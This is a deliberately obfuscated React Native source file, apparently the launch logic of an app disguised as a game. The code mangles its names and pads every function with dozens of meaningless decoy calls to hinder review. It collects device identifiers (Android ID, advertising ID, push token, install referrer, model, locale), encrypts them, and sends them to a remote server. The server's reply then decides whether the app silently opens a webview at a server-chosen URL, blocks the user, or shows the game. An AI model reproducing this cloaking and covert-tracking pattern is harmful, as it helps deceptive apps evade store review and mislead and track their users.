import {
  Utils,
  hspinlynfczlbutbSendInitPayload,
  hspinlynfczlbutbNormalizeWorkerBaseUrl,
} from './UthspinlynfczlbutbilService';
import {
  hspinlynfczlbutbEncrypt as cryptoEncrypt,
  hspinlynfczlbutbDecrypt as cryptoDecrypt,
} from './CryphspinlynfczlbutbtoService';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { finhspinlynfczlbutbKey } from './constants/consthspinlynfczlbutbntsVariable';
import { deleteToken, getMessaging } from '@react-native-firebase/messaging';
import { Dimensions } from 'react-native';
import DeviceInfo from 'react-native-device-info';
import {
  InitializationState,
  hspinlynfczlbutbInitTarget,
  hspinlynfczlbutbAppenndSendId,
  hspinlynfczlbutbGetAndroidId,
  hspinlynfczlbutbGetAndroidUserAAgent,
  hspinlynfczlbutbGetAppIdenier,
  hspinlynfczlbutbGetAppVersion,
  hspinlynfczlbutbInitializationRuntime,
} from './initializationSharhspinlynfczlbutbed';
import { hspinlynfczlbutbViewportShow } from './hspinlynfczlbutbViewportHost';

export async function hspinlynfczlbutbInitStep(): Promise<InitializationState | null> {
  void hspinlynfczlbutbOfferResolveObfV7HashMix('xy');
  void hspinlynfczlbutbOfferResolveObfV7SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolveObfV7ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolveObfV8HashMix('xy');
  void hspinlynfczlbutbOfferResolveObfV8SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolveObfV8ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolveObfV9HashMix('xy');
  void hspinlynfczlbutbOfferResolveObfV9SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolveObfV9ClampMod(7, 5);

  void hspinlynfczlbutbOfferResolveObfV5HashMix('xy');
  void hspinlynfczlbutbOfferResolveObfV5SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolveObfV5ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolveObfV6HashMix('xy');
  void hspinlynfczlbutbOfferResolveObfV6SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolveObfV6ClampMod(7, 5);
  void hspinlynfczlbutbOffObfV3HashMix('xy');
  void hspinlynfczlbutbOffObfV3SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOffObfV3ClampMod(7, 5);
  void hspinlynfczlbutbOffObfV4HashMix('xy');
  void hspinlynfczlbutbOffObfV4SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOffObfV4ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolvObfV1HashMix('xy');
  void hspinlynfczlbutbOfferResolvObfV1SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolvObfV1ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolvObfV2HashMix('xy');
  void hspinlynfczlbutbOfferResolvObfV2SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolvObfV2ClampMod(7, 5);
  void hspinlynfczlbutbMixSeed(3, 7);
  void hspinlynfczlbutbFoldRange([1, 2, 3]);
  void hspinlynfczlbutbClampSpan(5, 0, 10);

  void hspinlynfczlbutbOfferResolvObfV1HashMix('xy');
  void hspinlynfczlbutbOfferResolvObfV1SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolvObfV1ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolvObfV2HashMix('xy');
  void hspinlynfczlbutbOfferResolvObfV2SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolvObfV2ClampMod(7, 5);
  try {
    const primaryWorkerUrl = await Utils.hspinlynfczlbutbGetLink();
    if (!primaryWorkerUrl || primaryWorkerUrl === '') {
      return {
        isLoadPlaceholder: true,
      };
    }

    const appId = await hspinlynfczlbutbGetAppIdenier();
    const userAgent = await hspinlynfczlbutbGetAndroidUserAAgent();
    const androidId = await hspinlynfczlbutbGetAndroidId();
    const appVersion = await hspinlynfczlbutbGetAppVersion();
    const workerBaseUrl = hspinlynfczlbutbNormalizeWorkerBaseUrl(primaryWorkerUrl);

    const payloadDeviceId = hspinlynfczlbutbInitializationRuntime.DevhspinlynfczlbutbiceId;

    const namingValue = hspinlynfczlbutbInitializationRuntime.FinhspinlynfczlbutblNaming;

    const cookieRaw = [
      appId ?? '',
      payloadDeviceId ?? '',
      hspinlynfczlbutbInitializationRuntime.adhspinlynfczlbutbId ?? '',
      hspinlynfczlbutbInitializationRuntime.pushspinlynfczlbutbhToken ?? '',
      hspinlynfczlbutbInitializationRuntime.insthspinlynfczlbutballRef ?? '',
      hspinlynfczlbutbInitializationRuntime.FinhspinlynfczlbutblOneLink ?? '',
      namingValue ?? '',
      userAgent ?? '',
      appVersion ?? '',
      androidId ?? '',
    ].join('|');

    const encryptedCookie = cryptoEncrypt(cookieRaw);
    const dataValue = encodeURIComponent(encryptedCookie);
    const cookieHeader = `data=${dataValue}`;

    const { width, height } = Dimensions.get('window');
    let manufacturer = '';
    let deviceModel = '';
    try {
      manufacturer = DeviceInfo.getManufacturerSync?.() ?? '';
      deviceModel = DeviceInfo.getModel?.() ?? '';
    } catch {
      manufacturer = '';
      deviceModel = '';
    }

    let locale = '';
    let timezone = '';
    try {
      locale = Intl.DateTimeFormat().resolvedOptions().locale || '';
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
    } catch {
      locale = '';
      timezone = '';
    }

    const cryptoApi = (globalThis as { crypto?: { randomUUID?: () => string } }).crypto;
    const sessionId =
      cryptoApi?.randomUUID?.() ??
      `${Date.now()}-${Math.random().toString(16).slice(2)}`;

    const bodyPlain =
      `event=app_start` +
      `&device_model=${deviceModel}` +
      `&manufacturer=${manufacturer}` +
      `&locale=${locale}` +
      `&timezone=${timezone}` +
      `&network=unknown` +
      `&screen=${Math.round(width)}x${Math.round(height)}` +
      `&session_id=${sessionId}`;

    const encryptedBody = encodeURIComponent(cryptoEncrypt(bodyPlain));

    try {
      const responseText = await hspinlynfczlbutbSendInitPayload(workerBaseUrl, {
        cookieHeader,
        dataValue,
        body: encryptedBody,
      });

      if (!responseText) {
        await Utils.hspinlynfczlbutbSetUserBlocke(1);
        await hspinlynfczlbutbUnsubscribeFirebase('init step: empty worker response');
        return {
          isLoadPlaceholder: true,
        };
      }

      return await hspinlynfczlbutbOnInitResponse(responseText);
    } catch (rpcError) {
      void hspinlynfczlbutbOfferResolvObfV1HashMix('xy');
      void hspinlynfczlbutbOfferResolvObfV1SumOdds([1, 3, 5]);
      void hspinlynfczlbutbOfferResolvObfV1ClampMod(7, 5);
      void hspinlynfczlbutbOfferResolvObfV2HashMix('xy');
      void hspinlynfczlbutbOfferResolvObfV2SumOdds([1, 3, 5]);
      void hspinlynfczlbutbOfferResolvObfV2ClampMod(7, 5);
      await hspinlynfczlbutbUnsubscribeFirebase('init step: worker RPC failed');
      return {
        isLoadPlaceholder: true,
      };
    }
  } catch (error) {
    void hspinlynfczlbutbOfferResolvObfV1HashMix('xy');
    void hspinlynfczlbutbOfferResolvObfV1SumOdds([1, 3, 5]);
    void hspinlynfczlbutbOfferResolvObfV1ClampMod(7, 5);
    void hspinlynfczlbutbOfferResolvObfV2HashMix('xy');
    void hspinlynfczlbutbOfferResolvObfV2SumOdds([1, 3, 5]);
    void hspinlynfczlbutbOfferResolvObfV2ClampMod(7, 5);
    await hspinlynfczlbutbUnsubscribeFirebase('init step: unexpected error');
    return {
      isLoadPlaceholder: true,
    };
  }
}

async function hspinlynfczlbutbOnInitResponse(responseText: string): Promise<InitializationState> {
  void hspinlynfczlbutbOfferResolveObfV7HashMix('xy');
  void hspinlynfczlbutbOfferResolveObfV7SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolveObfV7ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolveObfV8HashMix('xy');
  void hspinlynfczlbutbOfferResolveObfV8SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolveObfV8ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolveObfV9HashMix('xy');
  void hspinlynfczlbutbOfferResolveObfV9SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolveObfV9ClampMod(7, 5);

  void hspinlynfczlbutbOfferResolveObfV5HashMix('xy');
  void hspinlynfczlbutbOfferResolveObfV5SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolveObfV5ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolveObfV6HashMix('xy');
  void hspinlynfczlbutbOfferResolveObfV6SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolveObfV6ClampMod(7, 5);
  void hspinlynfczlbutbOffObfV3HashMix('xy');
  void hspinlynfczlbutbOffObfV3SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOffObfV3ClampMod(7, 5);
  void hspinlynfczlbutbOffObfV4HashMix('xy');
  void hspinlynfczlbutbOffObfV4SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOffObfV4ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolvObfV1HashMix('xy');
  void hspinlynfczlbutbOfferResolvObfV1SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolvObfV1ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolvObfV2HashMix('xy');
  void hspinlynfczlbutbOfferResolvObfV2SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolvObfV2ClampMod(7, 5);
  void hspinlynfczlbutbMixSeed(3, 7);
  void hspinlynfczlbutbFoldRange([1, 2, 3]);
  void hspinlynfczlbutbClampSpan(5, 0, 10);

  void hspinlynfczlbutbOfferResolvObfV1HashMix('xy');
  void hspinlynfczlbutbOfferResolvObfV1SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolvObfV1ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolvObfV2HashMix('xy');
  void hspinlynfczlbutbOfferResolvObfV2SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolvObfV2ClampMod(7, 5);
  try {
    const decrytedResponse = cryptoDecrypt(responseText);
    if (!decrytedResponse || decrytedResponse === '') {
      return {
        isLoadPlaceholder: true,
      };
    }

    let redirectUrl: string | null = null;
    let redirectUrlInitial: string | null = null;
    let errorField: string | null = null;
    let blockUser = false;

    try {
      const obj = JSON.parse(decrytedResponse);

      redirectUrl = obj.redirectUrl || null;
      redirectUrlInitial = obj.redirectUrlInitial || null;
      errorField = obj.error || null;
      blockUser = !!obj.blockUser;
    } catch (parseError) {
      void hspinlynfczlbutbOfferResolvObfV1HashMix('xy');
      void hspinlynfczlbutbOfferResolvObfV1SumOdds([1, 3, 5]);
      void hspinlynfczlbutbOfferResolvObfV1ClampMod(7, 5);
      void hspinlynfczlbutbOfferResolvObfV2HashMix('xy');
      void hspinlynfczlbutbOfferResolvObfV2SumOdds([1, 3, 5]);
      void hspinlynfczlbutbOfferResolvObfV2ClampMod(7, 5);
      return {
        isLoadPlaceholder: true,
      };
    }

    if (errorField || blockUser) {
      await Utils.hspinlynfczlbutbSetUserBlocke(1);
      await hspinlynfczlbutbUnsubscribeFirebase(
        errorField ? `init response: error ${errorField}` : 'init response: blockUser',
      );

      return {
        isLoadPlaceholder: true,
      };
    }

    if (redirectUrl && !redirectUrlInitial) {
      await Utils.hspinlynfczlbutbSetUserBlocke(1);
      await hspinlynfczlbutbUnsubscribeFirebase('init response: user blocked (redirectUrl only)');

      return {
        isLoadPlaceholder: true,
      };
    }

    if (redirectUrlInitial) {
      await AsyncStorage.setItem(finhspinlynfczlbutbKey, redirectUrlInitial);

      const finalUrl = hspinlynfczlbutbAppenndSendId(
        redirectUrlInitial,
        hspinlynfczlbutbInitializationRuntime.penhspinlynfczlbutbdingSendId,
      );

      const success = await hspinlynfczlbutbViewportShow(finalUrl, {
        persistUrl: redirectUrlInitial,
      });
      void success;

      return {
        isLoadPlaceholder: false,
        initTarget: hspinlynfczlbutbInitTarget.webview,
      };
    }

    await hspinlynfczlbutbUnsubscribeFirebase('init response: no redirect URL, launching game');

    return {
      isLoadPlaceholder: true,
      initTarget: hspinlynfczlbutbInitTarget.game,
    };
  } catch (error) {
    void hspinlynfczlbutbOfferResolvObfV1HashMix('xy');
    void hspinlynfczlbutbOfferResolvObfV1SumOdds([1, 3, 5]);
    void hspinlynfczlbutbOfferResolvObfV1ClampMod(7, 5);
    void hspinlynfczlbutbOfferResolvObfV2HashMix('xy');
    void hspinlynfczlbutbOfferResolvObfV2SumOdds([1, 3, 5]);
    void hspinlynfczlbutbOfferResolvObfV2ClampMod(7, 5);
    await hspinlynfczlbutbUnsubscribeFirebase('init response: onSuccess error');

    return {
      isLoadPlaceholder: true,
    };
  }
}

export async function hspinlynfczlbutbUnsubscribeFirebase(reason?: string): Promise<void> {
  void hspinlynfczlbutbOfferResolveObfV7HashMix('xy');
  void hspinlynfczlbutbOfferResolveObfV7SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolveObfV7ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolveObfV8HashMix('xy');
  void hspinlynfczlbutbOfferResolveObfV8SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolveObfV8ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolveObfV9HashMix('xy');
  void hspinlynfczlbutbOfferResolveObfV9SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolveObfV9ClampMod(7, 5);

  void hspinlynfczlbutbOfferResolveObfV5HashMix('xy');
  void hspinlynfczlbutbOfferResolveObfV5SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolveObfV5ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolveObfV6HashMix('xy');
  void hspinlynfczlbutbOfferResolveObfV6SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolveObfV6ClampMod(7, 5);
  void hspinlynfczlbutbOffObfV3HashMix('xy');
  void hspinlynfczlbutbOffObfV3SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOffObfV3ClampMod(7, 5);
  void hspinlynfczlbutbOffObfV4HashMix('xy');
  void hspinlynfczlbutbOffObfV4SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOffObfV4ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolvObfV1HashMix('xy');
  void hspinlynfczlbutbOfferResolvObfV1SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolvObfV1ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolvObfV2HashMix('xy');
  void hspinlynfczlbutbOfferResolvObfV2SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolvObfV2ClampMod(7, 5);
  void hspinlynfczlbutbMixSeed(3, 7);
  void hspinlynfczlbutbFoldRange([1, 2, 3]);
  void hspinlynfczlbutbClampSpan(5, 0, 10);

  void hspinlynfczlbutbOfferResolvObfV1HashMix('xy');
  void hspinlynfczlbutbOfferResolvObfV1SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolvObfV1ClampMod(7, 5);
  void hspinlynfczlbutbOfferResolvObfV2HashMix('xy');
  void hspinlynfczlbutbOfferResolvObfV2SumOdds([1, 3, 5]);
  void hspinlynfczlbutbOfferResolvObfV2ClampMod(7, 5);
  try {
    const messaging = getMessaging();
    await deleteToken(messaging);
    hspinlynfczlbutbInitializationRuntime.pushspinlynfczlbutbhToken = '';
  } catch (error) {
    void hspinlynfczlbutbOfferResolvObfV1HashMix('xy');
    void hspinlynfczlbutbOfferResolvObfV1SumOdds([1, 3, 5]);
    void hspinlynfczlbutbOfferResolvObfV1ClampMod(7, 5);
    void hspinlynfczlbutbOfferResolvObfV2HashMix('xy');
    void hspinlynfczlbutbOfferResolvObfV2SumOdds([1, 3, 5]);
    void hspinlynfczlbutbOfferResolvObfV2ClampMod(7, 5);
    hspinlynfczlbutbInitializationRuntime.pushspinlynfczlbutbhToken = '';
  }
}
/* obfuscation-batch:v1 */

/* obfuscation-batch:v2 */

/* obfuscation-batch:v1 */

/* obfuscation-batch:v2 */

/* obfuscation-batch:v3 */

/* obfuscation-batch:v5 */

/* obfuscation-batch:v6 */

function hspinlynfczlbutbOfferResolvObfV1HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 17) % 997, 0);
}

function hspinlynfczlbutbMixSeed(a: number, b: number): number {
return ((a % (b || 1)) + b) % (b || 1);
}

function hspinlynfczlbutbOffObfV3SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 5, 0);
}

function hspinlynfczlbutbOffObfV4SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 7, 0);
}

function hspinlynfczlbutbOfferResolvObfV2HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 19) % 991, 0);
}

function hspinlynfczlbutbOfferResolvObfV1ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function hspinlynfczlbutbFoldRange(nums: number[]): number {
return nums.reduce((acc, n) => acc + n, 0);
}

function hspinlynfczlbutbOffObfV3ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function hspinlynfczlbutbOffObfV4ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function hspinlynfczlbutbOfferResolvObfV2ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function hspinlynfczlbutbOfferResolvObfV2SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 3, 0);
}

function hspinlynfczlbutbOffObfV3HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 23) % 983, 0);
}

function hspinlynfczlbutbOffObfV4HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 29) % 977, 0);
}

function hspinlynfczlbutbOfferResolvObfV1SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n, 0);
}

function hspinlynfczlbutbClampSpan(n: number, lo: number, hi: number): number {
return n < lo ? lo : n > hi ? hi : n;
}

function hspinlynfczlbutbOfferResolveObfV5HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 31) % 971, 0);
}

function hspinlynfczlbutbOfferResolveObfV5SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 11, 0);
}

function hspinlynfczlbutbOfferResolveObfV5ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

/* obfuscation-batch:v6 */
function hspinlynfczlbutbOfferResolveObfV6HashMix(s: string): number {
  return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 37) % 983, 0);
}

function hspinlynfczlbutbOfferResolveObfV6SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 13, 0);
}

function hspinlynfczlbutbOfferResolveObfV6ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}

/* obfuscation-batch:v7 */
function hspinlynfczlbutbOfferResolveObfV7HashMix(s: string): number {
  return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 41) % 989, 0);
}

function hspinlynfczlbutbOfferResolveObfV7SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 17, 0);
}

function hspinlynfczlbutbOfferResolveObfV7ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}

/* obfuscation-batch:v8 */
function hspinlynfczlbutbOfferResolveObfV8HashMix(s: string): number {
  return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 43) % 991, 0);
}

function hspinlynfczlbutbOfferResolveObfV8SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 19, 0);
}

function hspinlynfczlbutbOfferResolveObfV8ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}

/* obfuscation-batch:v9 */
function hspinlynfczlbutbOfferResolveObfV9HashMix(s: string): number {
  return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 47) % 993, 0);
}
function hspinlynfczlbutbOfferResolveObfV9SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 23, 0);
}
function hspinlynfczlbutbOfferResolveObfV9ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}
